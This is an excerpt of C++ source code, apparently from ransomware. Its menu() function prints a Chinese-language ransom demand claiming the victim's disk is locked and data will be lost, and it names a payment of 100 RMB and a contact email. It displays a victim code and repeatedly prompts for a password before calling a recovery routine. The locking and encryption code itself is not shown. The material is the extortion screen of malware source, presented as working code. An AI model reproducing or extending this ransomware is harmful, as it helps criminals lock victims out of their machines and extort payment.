...
void menu(string code, string psw)
{
	...
	printf("---------------------------------------\n\n");
	printf("你的电脑被我毁了!\n\n");
	printf("不要试图关闭或重新启动计算机.\n");
	printf("除非你付赎金,否则你的数据会丢失.\n");
	printf("我已将你的代码放在了此路径下的\"Code.Key\"文件中.\n");
	printf("你不能启动PE,因为硬盘已经有一个逻辑锁.\n");
	printf("赎金:100人民币.Email:diskkiller@winkiller.cf.\n");
	printf("Your code/你的代码:\n");
	printf("************************\n");
	printf("%s\n", code.c_str());
	printf("************************\n\n");
	char inp[1024];
	while (psw != inp)
	{
		printf("Input your password/输入你的密码:");
		scanf("%s", inp);
		printf("\n\n\n");
	}
	RecoveryAll();
	printf("密码正确,按任意键结束程序!请重启电脑以完成清理!\n");
